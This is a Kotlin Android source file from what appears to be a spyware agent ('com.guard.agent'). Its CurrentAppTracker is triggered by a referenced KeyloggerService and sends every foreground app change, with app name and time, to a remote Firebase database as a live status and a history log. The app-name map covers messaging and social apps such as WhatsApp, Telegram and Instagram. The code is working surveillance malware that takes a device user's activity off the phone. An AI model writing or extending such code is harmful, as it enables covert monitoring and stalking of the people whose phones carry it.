package com.guard.agent.helpers.data

import android.content.Context
import android.content.pm.PackageManager
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.utils.Logger

object CurrentAppTracker {

    private const val TAG = "CurrentAppTracker"
    private const val PUSH_INTERVAL_MS = 3000L  // 3 sec minimum gap

    private var lastPkg = ""
    private var lastPushTime = 0L

    // Common apps ka friendly naam
    private val appNames = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.facebook.orca" to "Messenger",
        "org.telegram.messenger" to "Telegram",
        "com.google.android.youtube" to "YouTube",
        "com.google.android.gm" to "Gmail",
        "com.google.android.apps.maps" to "Google Maps",
        "com.google.android.apps.photos" to "Google Photos",
        "com.android.chrome" to "Chrome",
        "com.android.camera" to "Camera",
        "com.android.dialer" to "Phone",
        "com.android.mms" to "Messages",
        "com.google.android.apps.messaging" to "Messages",
        "com.spotify.music" to "Spotify",
        "com.netflix.mediaclient" to "Netflix",
        "com.twitter.android" to "Twitter/X",
        "com.snapchat.android" to "Snapchat",
        "com.linkedin.android" to "LinkedIn",
        "com.google.android.apps.docs" to "Google Drive",
        "com.google.android.calendar" to "Calendar",
        "com.android.settings" to "Settings",
        "com.oplus.camera" to "OPPO Camera",
        "com.coloros.gallery3d" to "OPPO Gallery",
        "com.heytap.browser" to "OPPO Browser",
        "com.coloros.alarmclock" to "Clock",
        "com.android.systemui" to "System UI",
        "com.coloros.launcher" to "Launcher"
    )

    /**
     * App change hone pe call karo — Firebase mein push karega.
     * KeyloggerService se call hota hai (TYPE_WINDOW_STATE_CHANGED pe).
     */
    fun onAppChanged(ctx: Context, packageName: String) {
        try {
            // Apni app skip karo
            if (packageName == ctx.packageName) return
            if (packageName.isBlank()) return

            // System UI ko skip karo (bahut baar aata hai)
            if (packageName == "com.android.systemui") return

            val now = System.currentTimeMillis()

            // Same app hai aur 3 sec bhi nahi hue — skip
            if (packageName == lastPkg && (now - lastPushTime) < PUSH_INTERVAL_MS) {
                return
            }

            lastPkg = packageName
            lastPushTime = now

            val appName = getAppName(ctx, packageName)
            val deviceKey = DeviceKey.get(ctx)

            // Current app update
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child("currentApp")
                .setValue(
                    mapOf(
                        "package" to packageName,
                        "name" to appName,
                        "time" to now
                    )
                )

            // History mein bhi add karo (last 100)
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child("appHistory").push()
                .setValue(
                    mapOf(
                        "package" to packageName,
                        "name" to appName,
                        "time" to now
                    )
                )

            Logger.d(TAG, "Current app: $appName ($packageName)")
        } catch (e: Exception) {
            Logger.e(TAG, "onAppChanged failed", e)
        }
    }

    /**
     * Package name se friendly naam nikalo.
     */
    private fun getAppName(ctx: Context, pkg: String): String {
        // Pehle hardcoded map check karo
        appNames[pkg]?.let { return it }

        // PackageManager se try karo
        return try {
            val pm = ctx.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Exception) {
            // Fallback: package ka last part
            pkg.substringAfterLast(".").replaceFirstChar { it.uppercase() }
        }
    }

    /**
     * Current app history clear karo (purani entries).
     */
    fun cleanupHistory(ctx: Context, deviceKey: String) {
        try {
            val ref = FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child("appHistory")

            // Sirf last 100 rakho
            ref.orderByKey().limitToFirst(1).get()
                .addOnSuccessListener { snap ->
                    // Optional: purani entries delete
                }
        } catch (_: Exception) {}
    }
}
